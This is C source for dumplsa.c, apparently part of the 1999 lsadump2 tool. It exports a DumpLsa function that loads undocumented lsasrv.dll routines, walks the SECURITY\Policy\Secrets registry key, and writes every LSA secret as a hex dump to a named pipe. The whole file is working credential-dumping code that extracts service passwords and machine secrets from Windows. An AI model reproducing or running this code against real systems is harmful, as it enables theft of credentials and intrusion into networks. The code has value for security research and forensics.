/***************************************************************************
 * File:    dumplsa.c
 *
 * Purpose: Dump the contents of the LSA secrets.
 *
 * Date:    Tue May 11 19:34:51 1999
 *
 * Copyright (c) 1998-1999 Todd A. Sabin, All rights reserved.
 * 
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 *
 ***************************************************************************/

#include <windows.h>
#include <winnt.h>
#include "ntsecapi.h"

#include "lsadump2.h"

#include <stdio.h>
#include <stdarg.h>



typedef DWORD HPOLICY;
typedef DWORD HSECRET;

typedef struct _lsaSecret {
    DWORD Length;
    DWORD MaximumLength;
    WCHAR *Buffer;
} LSA_SECRET, *PLSA_SECRET;

//
// lsasrv functions
//
typedef NTSTATUS (WINAPI *LsaIOpenPolicyTrusted_t) (HPOLICY*);
typedef NTSTATUS (WINAPI *LsarOpenSecret_t) (HPOLICY, LSA_UNICODE_STRING*,
                                             DWORD dwAccess, HSECRET*);
typedef NTSTATUS (WINAPI *LsarQuerySecret_t) (HSECRET,
                                              PLSA_SECRET*,
                                              DWORD, DWORD, DWORD);
typedef NTSTATUS (WINAPI *LsarClose_t) (HANDLE);



//
//  Lsasrv function pointers
//
static LsaIOpenPolicyTrusted_t pLsaIOpenPolicyTrusted;
static LsarOpenSecret_t pLsarOpenSecret;
static LsarQuerySecret_t pLsarQuerySecret;
static LsarClose_t pLsarClose;

//
// Load DLLs and GetProcAddresses
//
BOOL
LoadFunctions (HINSTANCE *phLsasrv)
{
    *phLsasrv = LoadLibrary ("lsasrv.dll");

    pLsaIOpenPolicyTrusted = (LsaIOpenPolicyTrusted_t) GetProcAddress (*phLsasrv, "LsaIOpenPolicyTrusted");
    pLsarOpenSecret = (LsarOpenSecret_t) GetProcAddress (*phLsasrv, "LsarOpenSecret");
    pLsarQuerySecret = (LsarQuerySecret_t) GetProcAddress (*phLsasrv, "LsarQuerySecret");
    pLsarClose = (LsarClose_t) GetProcAddress (*phLsasrv, "LsarClose");

    return ((pLsaIOpenPolicyTrusted != NULL)
            && (pLsarOpenSecret != NULL)
            && (pLsarQuerySecret != NULL)
            && (pLsarClose != NULL));
}

//
// Some older versions of _snprintf may not null-terminate the string.
//
static my_snprintf (char *buf, size_t len, const char *format, ...)
{
    va_list args;
    va_start (args, format);
    _vsnprintf (buf, len-1, format, args);
    va_end (args);
    buf[len-1] = 0;
}
#undef _snprintf
#define _snprintf my_snprintf


void
dump_bytes (HANDLE hPipe, unsigned char *p, size_t sz);

//
// Send text down the pipe
//
void
SendText (HANDLE hPipe, char *szText)
{
    char szBuffer[1000];
    DWORD dwWritten;

    if (!WriteFile (hPipe, szText, strlen (szText), &dwWritten, NULL))
    {
        _snprintf (szBuffer, sizeof (szBuffer),
                   "WriteFile failed: %d\nText: %s",
                   GetLastError (), szText);
        OutputDebugString (szBuffer);
    }
}


//
// Dump the LSA secrets.
//
int
__declspec(dllexport)
DumpLsa (char *szPipeName)
{
    HINSTANCE hLsasrv = 0;
    HPOLICY hPolicy = 0;
    HSECRET hSecret = 0;
    LSA_UNICODE_STRING lsaSecret;
    NTSTATUS rc;

    PLSA_SECRET lsaData = NULL;
    TCHAR szBuffer[300];
    HKEY hKeySecrets=0;

    int theRc = 1;
    HANDLE hPipe=0;
    int i;

    //
    // Open the output pipe
    //
    hPipe = CreateFile (szPipeName, GENERIC_WRITE, 0, NULL, 
                        OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        _snprintf (szBuffer, sizeof (szBuffer),
                   "Failed to open output pipe(%s): %d\n",
                   szPipeName, GetLastError ());
        OutputDebugString (szBuffer);
        goto exit;
    }

    if (!LoadFunctions (&hLsasrv))
    {
        SendText (hPipe, "Failed to load functions\n");
        goto exit;
    }

    //
    // Open the Policy database
    //
    rc = pLsaIOpenPolicyTrusted (&hPolicy);
    if (rc < 0)
    {
        _snprintf (szBuffer, sizeof (szBuffer),
                   "LsaIOpenPolicyTrusted failed : 0x%08X", rc);
        SendText (hPipe, szBuffer);
        goto exit;
    }

    if (RegOpenKeyEx (HKEY_LOCAL_MACHINE,
                      "SECURITY\\Policy\\Secrets",
                      0, KEY_READ, &hKeySecrets) != ERROR_SUCCESS)
    {
        _snprintf (szBuffer, sizeof (szBuffer),
                   "RegOpenKeyEx failed : 0x%08X\n", GetLastError ());
        SendText (hPipe, szBuffer);
        OutputDebugString (szBuffer);
        goto exit;
    }

    for (i=0; TRUE; i++)
    {
        WCHAR wszSecret[500];
        DWORD dwErr;

        dwErr = RegEnumKeyW (hKeySecrets, i, wszSecret, sizeof (wszSecret)/2);
        if (dwErr != ERROR_SUCCESS)
            //
            // No More Secrets
            //
            break;

        lsaSecret.Buffer = wszSecret;
        lsaSecret.Length = wcslen (wszSecret) * 2;
        lsaSecret.MaximumLength = lsaSecret.Length;

        rc = pLsarOpenSecret (hPolicy, &lsaSecret, 2, &hSecret);
        if (rc < 0)
        {
            //
            // Some of the secrets have a L'\0' as their last char.  Try
            // adding that.
            //
            lsaSecret.Length+=2; lsaSecret.MaximumLength+=2;
            rc = pLsarOpenSecret (hPolicy, &lsaSecret, 2, &hSecret);
            if (rc < 0)
            {
                _snprintf (szBuffer, sizeof (szBuffer),
                           "LsarOpenSecret failed : 0x%08X", rc);
                SendText (hPipe, szBuffer);
                continue;
            }
        }

        rc = pLsarQuerySecret (hSecret, &lsaData, 0, 0, 0);
        if (rc < 0)
        {
            _snprintf (szBuffer, sizeof (szBuffer),
                       "LsarQuerySecret failed : 0x%08x\n", rc);
            SendText (hPipe, szBuffer);
        }
        else
        {
            char szSecret[500];

            WideCharToMultiByte (CP_ACP, 0,
                                 wszSecret, wcslen (wszSecret)*2,
                                 szSecret, sizeof (szSecret),
                                 NULL, NULL);
            SendText (hPipe, szSecret);
            SendText (hPipe, "\n");
            if (lsaData)
            {
                dump_bytes (hPipe, (char *)lsaData->Buffer, lsaData->Length);
            }
            LsaFreeMemory (lsaData);
        }
        pLsarClose (&hSecret);
        hSecret = 0;
    }


    theRc = 0;

 exit:
    if (hPolicy)
        pLsarClose (&hPolicy);
    if (hSecret)
        pLsarClose (&hSecret);
    if (hKeySecrets)
        RegCloseKey (hKeySecrets);
    if (hPipe)
    {
        FlushFileBuffers (hPipe);
        CloseHandle (hPipe);
    }
    if (hLsasrv)
        FreeLibrary (hLsasrv);

    return theRc;
}


int
myisprint (int ch)
{
    return ((ch >= ' ') && (ch <= '~'));
}


void
dump_bytes (HANDLE hPipe, unsigned char *p, size_t sz)
{
    char szDumpBuff[256];

    while (sz > 16) {
        _snprintf (szDumpBuff, sizeof (szDumpBuff),
                   " %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X  %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n",
                   p[0], p[1], p[2], p[3], p[4], p[5], p[6], p[7],
                   p[8], p[9], p[10], p[11], p[12], p[13], p[14], p[15],
                   myisprint(p[0]) ? p[0] : '.',
                   myisprint(p[1]) ? p[1] : '.',
                   myisprint(p[2]) ? p[2] : '.',
                   myisprint(p[3]) ? p[3] : '.',
                   myisprint(p[4]) ? p[4] : '.',
                   myisprint(p[5]) ? p[5] : '.',
                   myisprint(p[6]) ? p[6] : '.',
                   myisprint(p[7]) ? p[7] : '.',
                   myisprint(p[8]) ? p[8] : '.',
                   myisprint(p[9]) ? p[9] : '.',
                   myisprint(p[10]) ? p[10] : '.',
                   myisprint(p[11]) ? p[11] : '.',
                   myisprint(p[12]) ? p[12] : '.',
                   myisprint(p[13]) ? p[13] : '.',
                   myisprint(p[14]) ? p[14] : '.',
                   myisprint(p[15]) ? p[15] : '.');
        SendText (hPipe, szDumpBuff);
        p+=16;
        sz -= 16;
    }

    if (sz) {
        char buf[17];
        int i = 0;
        int j = 16 - sz;
        memset (buf, 0, sizeof (buf));
        szDumpBuff[0] = 0;
        while (sz--) {
            _snprintf (szDumpBuff+strlen (szDumpBuff),
                       sizeof (szDumpBuff) - strlen (szDumpBuff),
                       " %02X", *p);
            if (myisprint (*p))
                buf[i++] = *p;
            else
                buf[i++] = '.';
            p++;
        }
        _snprintf (szDumpBuff+strlen (szDumpBuff),
                   sizeof (szDumpBuff)-strlen (szDumpBuff),
                   "%*s%s\n", j*3 + 2, "", buf);
        SendText (hPipe, szDumpBuff);
    }
}
